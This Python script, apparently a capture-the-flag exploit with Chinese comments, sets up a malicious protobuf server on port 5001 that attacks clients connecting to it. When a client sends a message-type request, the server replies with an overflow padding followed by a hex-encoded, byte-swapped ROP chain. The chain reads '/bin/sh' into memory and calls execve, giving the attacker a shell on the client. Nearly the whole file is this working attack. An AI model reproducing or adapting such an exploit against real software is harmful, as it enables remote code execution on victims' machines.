import socket
from time import sleep
from odd_pb2 import Message,Opcode # 生成的protobuf文件
from pwn import*
syscall_addr=0x65c47b
binshell_addr=0x765a98 # 在 bss 上随便放
pop_rsi=0x4161b3
pop_rdi=0x4146a4
pop_rdx_rbx=0x6615ab
pop_rax=0x54688a
# syscall read and syscall binshell
# Helper function to send protobuf message over a socket
def send_proto_message(conn, proto_message):
    print("send_proto_message:",proto_message,proto_message.cont)
    serialized_message = proto_message.SerializeToString()
    length = len(serialized_message)
    conn.sendall(serialized_message)

# Helper function to receive protobuf message from a socket
def receive_proto_message(conn):
    serialized_message = conn.recv(1024)
    message = Message()
    message.ParseFromString(serialized_message)
    return message
    
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ('0.0.0.0', 5001)
print(f'starting up on {server_address[0]} port {server_address[1]}')
sock.bind(server_address)

# Listen for incoming connections
sock.listen(4)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        while True:
            print(f'connection from {client_address}')
            # Receive the message from the client
            serialized_message = connection.recv(1024)
            if not serialized_message:
                break
            client_message = Message()
            client_message.ParseFromString(serialized_message)
            print(f'Received message: {client_message}')

            # Create a response message
            response_message = Message()
            response_message.magic = 875704370
            response_message.seq = client_message.seq+1
            response_message.opcode = client_message.opcode # 写法 from 凯华
            if response_message.opcode==Opcode.OP_MSG:
                # padding 是 0x428 长度
                padding_len=0x428
                rop=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(binshell_addr)+p64(pop_rdx_rbx-1)+p64(0x30)+p64(0)+p64(pop_rax)+p64(0)+p64(syscall_addr)
                rop+=p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binshell_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx_rbx)+p64(0)+p64(0)+p64(syscall_addr)
                # do hex
                s=""
                for i in range(len(rop)):
                    t_low=rop[i]&0xf
                    t_high=rop[i]>>4
                    if t_low<10:
                        s+=chr(t_low+48)
                    else:
                        s+=chr(t_low+87)
                    if t_high<10:
                        s+=chr(t_high+48)
                    else:
                        s+=chr(t_high+87)
                # 相邻奇偶字换序
                s2=""
                for i in range(0,len(s),2):
                    s2+=s[i+1]
                    s2+=s[i]    
                response_message.cont = b"h"*padding_len*2+s2.encode("latin-1")
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_HELLO:
                response_message.cont = b"helloOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_SESSION:
                response_message.cont = b"sessionOk"
                send_proto_message(connection, response_message)
            elif response_message.opcode==Opcode.OP_END:
                response_message.cont = b"Ok"
                # Send the response back to the client
                send_proto_message(connection, response_message)

    finally:
        # Clean up the connection
        connection.close()
